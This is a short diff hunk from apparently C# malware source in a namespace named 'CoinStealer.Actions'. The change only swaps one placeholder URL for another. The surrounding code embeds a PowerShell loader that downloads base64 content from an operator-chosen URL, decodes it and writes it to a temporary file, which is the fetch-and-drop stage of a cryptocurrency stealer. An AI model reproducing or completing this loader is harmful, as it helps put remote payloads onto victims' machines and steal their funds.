@@ -25,7 +25,7 @@ namespace CoinStealer.Actions
             Console.ForegroundColor = ConsoleColor.Cyan;
             source =
 @"
-$source = (Invoke-WebRequest -Uri ""http://change-me-for-your-url.com"" -UseBasicParsing).Content.Trim();
+$source = (Invoke-WebRequest -Uri ""http://change-me-for-your-download-url.com"" -UseBasicParsing).Content.Trim();
 $source=[System.Convert]::FromBase64String($source);
 $file=[System.IO.Path]::GetTempFileName();
 [System.IO.File]::WriteAllBytes($file,$source);
